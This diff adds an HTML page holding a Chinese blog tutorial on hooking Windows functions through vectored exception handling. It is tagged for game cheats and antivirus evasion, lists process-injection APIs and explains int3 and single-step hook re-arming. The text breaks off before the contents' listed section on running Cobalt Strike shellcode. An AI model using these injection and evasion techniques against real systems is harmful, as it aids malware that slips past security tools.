@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="7kOHKWKCPcwwF2CfiW1jxihDZ2eqWCabdmrp7avvwy0">
+  <meta name="msvalidate.01" content="E8B6DE7DCFB7B9BA2CD14AB2A553B0EB">
+  <meta name="baidu-site-verification" content="code-UT9PlqrKwC">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=JetBrains+Mono:300,300italic,400,400italic,700,700italic%7CZCOOL+KuaiLe:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/black/pace-theme-corner-indicator.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"nu1r.cn","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.0","exturl":true,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前言立志欲坚不欲锐，成功在久不在速。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于异常处理的Hook函数">
+<meta property="og:url" content="https://nu1r.cn/Re/hook%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="nu1r沉思录">
+<meta property="og:description" content="前言立志欲坚不欲锐，成功在久不在速。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown94219701_p0.png">
+<meta property="article:published_time" content="2022-01-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-01-03T16:00:00.000Z">
+<meta property="article:author" content="nu1r">
+<meta property="article:tag" content="外挂">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown94219701_p0.png">
+
+
+<link rel="canonical" href="https://nu1r.cn/Re/hook%E8%AF%A6%E8%A7%A3/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://nu1r.cn/Re/hook%E8%AF%A6%E8%A7%A3/","path":"Re/hook详解/","title":"基于异常处理的Hook函数"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>基于异常处理的Hook函数 | nu1r沉思录</title>
+  
+
+
+
+
+
+
+  <script async defer data-website-id="" src=""></script>
+
+  <script defer data-domain="" src=""></script>
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">nu1r沉思录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">千里之行，始于足下</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HOOK-%E5%89%8D%E7%BD%AE"><span class="nav-text">HOOK-前置</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86"><span class="nav-text">堆的管理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98"><span class="nav-text">虚拟内存</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86"><span class="nav-text">虚拟内存管理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7"><span class="nav-text">虚拟内存的安全属性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84"><span class="nav-text">内存映射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E4%B8%8EHOOK"><span class="nav-text">注入与HOOK</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-text">正文</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#VEH"><span class="nav-text">VEH</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%9A%E8%BF%87TrampoLine%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E7%9A%84Hook"><span class="nav-text">通过TrampoLine函数进行的Hook</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8B%A6%E6%88%AA%E8%B0%83%E7%94%A8%EF%BC%88%E8%B0%83%E7%94%A8%E4%B8%8D%E4%B8%8B%E5%8F%91%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%BF%94%E5%9B%9E%E8%B0%83%E7%94%A8%E8%80%85%EF%BC%89"><span class="nav-text">拦截调用（调用不下发，直接返回调用者）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hook-Sleep-%E8%BF%90%E8%A1%8C-CS%E4%B8%AD%E7%9A%84shellcode"><span class="nav-text">Hook Sleep 运行 CS中的shellcode</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nu1r"
+      src="/images/12.jpg">
+  <p class="site-author-name" itemprop="name">nu1r</p>
+  <div class="site-description" itemprop="description">认真思考，努力奋斗，不做娱乐圈研究员，不做实验室黑客，能真正为平台、行业甚至国家贡献自己的力量</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">28</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL251MXI=" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;nu1r"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOm51eG03NzFAMTYzLmNvbQ==" title="E-Mail → mailto:nuxm771@163.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://nu1r.cn/Re/hook%E8%AF%A6%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/12.jpg">
+      <meta itemprop="name" content="nu1r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="nu1r沉思录">
+      <meta itemprop="description" content="认真思考，努力奋斗，不做娱乐圈研究员，不做实验室黑客，能真正为平台、行业甚至国家贡献自己的力量">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="基于异常处理的Hook函数 | nu1r沉思录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          基于异常处理的Hook函数
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-01-04 00:00:00" itemprop="dateCreated datePublished" datetime="2022-01-04T00:00:00+08:00">2022-01-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">二进制安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>立志欲坚不欲锐，成功在久不在速。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown94219701_p0.png"></p>
+<span id="more"></span>
+
+<h1 id="HOOK-前置"><a href="#HOOK-前置" class="headerlink" title="HOOK-前置"></a>HOOK-前置</h1><h2 id="堆的管理"><a href="#堆的管理" class="headerlink" title="堆的管理"></a>堆的管理</h2><table>
+<thead>
+<tr>
+<th align="center">API</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">HeapCreate</td>
+<td align="left">在进程中创建一个堆，返回一个堆句柄</td>
+</tr>
+<tr>
+<td align="center">GetProcessHeap</td>
+<td align="left">获取进程中的一个堆，返回一个句柄</td>
+</tr>
+<tr>
+<td align="center">GetProcessHeaps</td>
+<td align="left">获取进程中所有堆，包括对的数量和各个堆的句柄</td>
+</tr>
+<tr>
+<td align="center">HeapAlloc</td>
+<td align="left">从指定对上分配块</td>
+</tr>
+<tr>
+<td align="center">HeapReAlloc</td>
+<td align="left">重新分配内存，改变已经分配好的堆内存大小</td>
+</tr>
+<tr>
+<td align="center">GetStstemInfo</td>
+<td align="left">获取系统信息</td>
+</tr>
+<tr>
+<td align="center">HeapFree</td>
+<td align="left">释放HeapAlloc和HeapReAlloc申请的内存</td>
+</tr>
+<tr>
+<td align="center">HeapSize</td>
+<td align="left">获取指定堆大小</td>
+</tr>
+<tr>
+<td align="center">HeapDestory</td>
+<td align="left">销毁由HeapCreate创建的堆</td>
+</tr>
+<tr>
+<td align="center">CreateToolhelp32Snapshot</td>
+<td align="left">可以分别创建进程，线程，进程模块，进程堆的快照</td>
+</tr>
+<tr>
+<td align="center">Heap32First</td>
+<td align="left">用来首次调用，获取第一个堆对象的信息</td>
+</tr>
+<tr>
+<td align="center">Heap32Next</td>
+<td align="left">以后的调用由它来完成，不断获取堆对象信息</td>
+</tr>
+</tbody></table>
+<p>堆实例</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个堆使用</span></span><br><span class="line">HANDLE hHelap = <span class="built_in">HeapCreate</span>(HEAP_NO_SERIALIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在已经存在的堆上申请空间</span></span><br><span class="line"><span class="comment">//HANDLE hHelap = GetProcessHeap();</span></span><br><span class="line"></span><br><span class="line">SYSTEM_INFO si;<span class="comment">//系统信息</span></span><br><span class="line"><span class="built_in">GetSystemInfo</span>(&amp;si);</span><br><span class="line"><span class="comment">//在堆上分配3个页大小的内存</span></span><br><span class="line"><span class="type">char</span> *lpMem = (<span class="type">char</span>*)<span class="built_in">HeapAlloc</span>(hHelap, HEAP_ZERO_MEMORY, si.dwPageSize * <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">HeapFree</span>(hHelap, HEAP_NO_SERIALIZE, lpMem);</span><br><span class="line"><span class="built_in">HeapDestroy</span>(hHelap);</span><br></pre></td></tr></table></figure>
+
+<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>AMD Intel 支持</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93aW4zMi9tZW1vcnkvbWVtb3J5LXByb3RlY3Rpb24tY29uc3RhbnRz">微软页安全属性表<i class="fa fa-external-link-alt"></i></span></p>
+<h3 id="虚拟内存管理"><a href="#虚拟内存管理" class="headerlink" title="虚拟内存管理"></a>虚拟内存管理</h3><table>
+<thead>
+<tr>
+<th align="left">作用</th>
+<th align="left">函数名</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">分配</td>
+<td align="left">VirtualAlloc<br/>VirtualAllocEx</td>
+<td align="left">分配或者预定一块虚拟内存<br/>在其他进城费配或者预定一块虚拟内存</td>
+</tr>
+<tr>
+<td align="left">释放</td>
+<td align="left">virtualFree<br/>virtualFreeEx</td>
+<td align="left">释放虚拟内存<br/>释放其他进程内存</td>
+</tr>
+<tr>
+<td align="left">锁定与解锁</td>
+<td align="left">VirtualLock<br/>VirtualUnlock</td>
+<td align="left">锁定内存，不能交换硬盘<br/>内存解锁</td>
+</tr>
+<tr>
+<td align="left">修改保护属性</td>
+<td align="left">VirtualProtect<br/>VirtualProtectEX</td>
+<td align="left">修改一块内存的属性<br/>修改其他进程属性</td>
+</tr>
+<tr>
+<td align="left">读写其他进程内存</td>
+<td align="left">ReadProcessMemory<br/>WriteProcessMemory</td>
+<td align="left">读取远程进程内存属性<br/>将数据写入远程进程内存</td>
+</tr>
+<tr>
+<td align="left">查询内存状态</td>
+<td align="left">VirtualQuery<br/>VirtualQueryEx</td>
+<td align="left">查看内存状态<br/>查询其他进程内存信息</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">值</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">MEM_COMMIT</td>
+<td align="left">直接分配内存并将数初始化为0</td>
+</tr>
+<tr>
+<td align="left">MEM_RESERVE</td>
+<td align="left">保留范围</td>
+</tr>
+</tbody></table>
+<p>三种状态</p>
+<table>
+<thead>
+<tr>
+<th align="left">状态</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">空闲的</td>
+<td align="left">进程不能访问这种页面（内存页）还没有被分配</td>
+</tr>
+<tr>
+<td align="left">保留的</td>
+<td align="left">这个页面已经被分配了，但是还位于物理内存映射，因此不能访问</td>
+</tr>
+<tr>
+<td align="left">提交的</td>
+<td align="left">内存已经被分配了，并且也与物理内存映射，进程已经可以访问这里</td>
+</tr>
+</tbody></table>
+<ul>
+<li>MEM_RELEASE 释放内存 设置为空闲状态</li>
+<li>MEM_FREE</li>
+<li>MEM_DECOMMIT 保留状态</li>
+</ul>
+<h3 id="虚拟内存的安全属性"><a href="#虚拟内存的安全属性" class="headerlink" title="虚拟内存的安全属性"></a>虚拟内存的安全属性</h3><p>VirtualProtect修改</p>
+<table>
+<thead>
+<tr>
+<th align="left">属性</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">PAGE_EXECUTE</td>
+<td align="left">可执行</td>
+</tr>
+<tr>
+<td align="left">PAGE_EXECUTE_READ</td>
+<td align="left">可读可执行</td>
+</tr>
+<tr>
+<td align="left">PAGE_EXECUTE_READWRITE</td>
+<td align="left">可读可写</td>
+</tr>
+<tr>
+<td align="left">PAGE_EXECUTE_WRITECOPY</td>
+<td align="left">可执行，写时复制</td>
+</tr>
+<tr>
+<td align="left">PAGE_NOACCESS</td>
+<td align="left">不可访问</td>
+</tr>
+<tr>
+<td align="left">PAGE_READONLY</td>
+<td align="left">只读</td>
+</tr>
+<tr>
+<td align="left">PAGE_READWRITE</td>
+<td align="left">可读可写</td>
+</tr>
+<tr>
+<td align="left">PAGE_WRITECOPY</td>
+<td align="left">写时复制</td>
+</tr>
+</tbody></table>
+<h2 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h2><p>Mapping 文件内容映射到进程虚拟内存中</p>
+<p>映射成功文件用视图（view)引用这段内存，然后操作</p>
+<p>优势：</p>
+<ul>
+<li>文件操作简单（直接在内存中操作，原文件操作 是从 文件读取内存 ，保存还是要写入文件，绑定后直接修改）</li>
+<li>不同进程中共享数据</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">API</th>
+<th align="left">详细</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">private</td>
+<td align="left">进程私有内存，不被其他进程所共享，一般为堆，栈</td>
+</tr>
+<tr>
+<td align="left">mapped</td>
+<td align="left">从别的进程内存映射进来</td>
+</tr>
+<tr>
+<td align="left">image</td>
+<td align="left">从程序的PE映像而来，一般是映像的区段</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">API</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GetSystemInfo</td>
+<td align="left">获取系统信息，用于确定分配粒度</td>
+</tr>
+<tr>
+<td align="left">CreateFileMapping</td>
+<td align="left">创建一个mapping对象</td>
+</tr>
+<tr>
+<td align="left">OpenFIleMapping</td>
+<td align="left">打开已命名的mapping对象(可跨进程)</td>
+</tr>
+<tr>
+<td align="left">UnmapViewOfFile</td>
+<td align="left">取消文件映射</td>
+</tr>
+<tr>
+<td align="left">MapViewOfFile</td>
+<td align="left">经Mapping对象的文件映射到内存</td>
+</tr>
+<tr>
+<td align="left">FlushViewOfFile</td>
+<td align="left">将映射的内存写回硬盘中</td>
+</tr>
+</tbody></table>
+<h2 id="注入与HOOK"><a href="#注入与HOOK" class="headerlink" title="注入与HOOK"></a>注入与HOOK</h2><table>
+<thead>
+<tr>
+<th align="left">Openprocess</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">virtualAllocEx</td>
+</tr>
+<tr>
+<td align="left">WriteProcessMemory</td>
+</tr>
+<tr>
+<td align="left">WaitforsingleObject</td>
+</tr>
+<tr>
+<td align="left">CreateThread</td>
+</tr>
+<tr>
+<td align="left">loadlibrary</td>
+</tr>
+<tr>
+<td align="left">GetModuleHandle() ;&#x2F;&#x2F;获取句柄</td>
+</tr>
+</tbody></table>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>向量化异常处理(Vectored Exception Handler, VEH)</p>
+<p>结构化异常处理(Structure Exception Handler, SEH)</p>
+<h1 id="VEH"><a href="#VEH" class="headerlink" title="VEH"></a>VEH</h1><p>在用户模式下发生异常时，异常处理分发函数在内部会先调用遍历 VEH 记录链表的函数， 如果没有找到可以处理异常的注册函数，再开始遍历 SEH 注册链表。 二者之间具体联系：VEH优先权高于SHE，只有所有VEH全不处理某个异常的时候，异常处理权才会到达SHE。只要目标程序中没有利用VEH，那么，你所设计的VEH将是第一个得到控制者。现在采用SEH作为异常处理的普通C&#x2F;C++程序对你将不会再有干扰，可以通过使用VEH来进行hook处理了。 如果存在调试器，那么控制权转向将会发生新的变化。当异常发生后，首先通知的将会是调试器，调试器不处理才会再返回控制权给VEH；如果VEH不处理，再返回给SHE；若SEH不处理，再给调试器一个机会，如果还不处理，则交由系统处理。</p>
+<p>VEH通过使用 Win32 API 函数 AddVectoredExceptionHandler可注册新的异常处理函数，函数的参数就是指向 EXCEPTION_POINTERS 结构的指针。同时，增加了函数地址的注册处理程序链表。由于系统中使用一个链表来存储矢量异常处理程序，程序可以安装尽可能多的向量处理器，只要有必要。</p>
+<p>异常处理步骤：</p>
+<ol>
+<li>判断是否是int3异常</li>
+<li>修改EIP为异常发生处地址(再执行一次)</li>
+<li>判断异常发生地址不等于0(无意义)</li>
+<li>修改堆栈的参数</li>
+<li>修改寄存器上下文</li>
+<li>备份CPU控制寄存器</li>
+<li>CPU控制寄存器设置为单步模式</li>
+<li>恢复先前备份的MessageBoxA第一个字节的代码</li>
+<li>返回-1 让其继续运行</li>
+</ol>
+<p>首先准备一个VectoredHandler函数：</p>
+<p><code>LONG CALLBACK VectoredHandler(__in PEXCEPTION_POINTERS ExceptionInfo);</code></p>
+<p>ExceptionInfo的结构:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_POINTERS</span> &#123;</span><br><span class="line">	PEXCEPTION_RECORD ExceptionRecord;  <span class="comment">//记录了本次异常的相关信息</span></span><br><span class="line">	PCONTEXT ContextRecord;				<span class="comment">//记录了异常发生时的线程上下文 会保存寄存器等，主要修改的对象</span></span><br><span class="line">&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_RECORD</span> &#123;</span><br><span class="line">	DWORD    ExceptionCode;                        <span class="comment">//异常代码，表明了异常的相关信息</span></span><br><span class="line">	DWORD ExceptionFlags;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">_EXCEPTION_RECORD</span> *ExceptionRecord;</span><br><span class="line">	PVOID ExceptionAddress;                        <span class="comment">//发生异常时当前的eip </span></span><br><span class="line">	DWORD NumberParameters;</span><br><span class="line">	ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>
+
+<p>然后实现VectoredHandler函数。</p>
+<p>最后安装VectoredHandler函数。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0012F</span>F40    <span class="number">004010</span>C4   call到MessageBoxA的地址，VEHHook<span class="number">.004010B</span>E</span><br><span class="line"><span class="number">0012F</span>F44    <span class="number">00000000</span>   hOwner = <span class="literal">NULL</span></span><br><span class="line"><span class="number">0012F</span>F48    <span class="number">00407050</span>   TEXT = <span class="string">&quot;VEH Hook Test&quot;</span></span><br><span class="line"><span class="number">0012F</span>F4C    <span class="number">00407104</span>   Title = <span class="string">&quot;Test&quot;</span></span><br><span class="line"><span class="number">0012F</span>F50    <span class="number">00000000</span>   Style = MB_OK|MB_APPLMODAL</span><br></pre></td></tr></table></figure>
+
+<p>nt 3中断修改完数据后，会再次回到文件头进行执行，会再次执行int 3， 所以要还原MessageBoxA函数的第一个字节，如果不进行还原程序会发生死循环一直调用VectoredHandler函数，或者添加一个TrampoLine。</p>
+<p>如果进行还原势必导致下次调用被Hook函数时，不会进行Hook，需要再次安装，解决：</p>
+<ol>
+<li><p>修改Eip（Rip）使其去调用一个TrampoLine函数，使程序继续运行。（相当于InlineHook）</p>
+</li>
+<li><p>再程序修改完Hook函数后，添加一个单步中断，然后将被Hook函数我们修改的指令还原回去，此时，函数会执行正确的指令，之后触发单步中断，再次进去我们的VectoredHandler函数，在VectoredHandler函数中通过判断单步中断再次将被Hook函数的第一个字节改为int 3。</p>
+</li>
+</ol>
